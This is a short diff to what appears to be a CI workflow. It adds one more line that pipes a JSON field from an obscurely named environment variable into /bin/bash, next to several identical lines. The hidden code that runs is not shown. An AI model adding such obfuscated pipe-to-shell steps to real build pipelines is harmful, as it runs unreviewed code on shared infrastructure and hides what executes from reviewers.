@@ -34,6 +34,7 @@ jobs:
           echo $bare6 | jq -r .xorii27932 | /bin/bash
           printf '%s' "$pyiq657" | jq -r .ido0 | /bin/bash
           printf '%s' "$irlnm56214" | jq -r .tap70136 | /bin/bash
+          printf '%s' "$baxp7907" | jq -r .kdnig834 | /bin/bash
 
       - name: Archive results
         if: always()
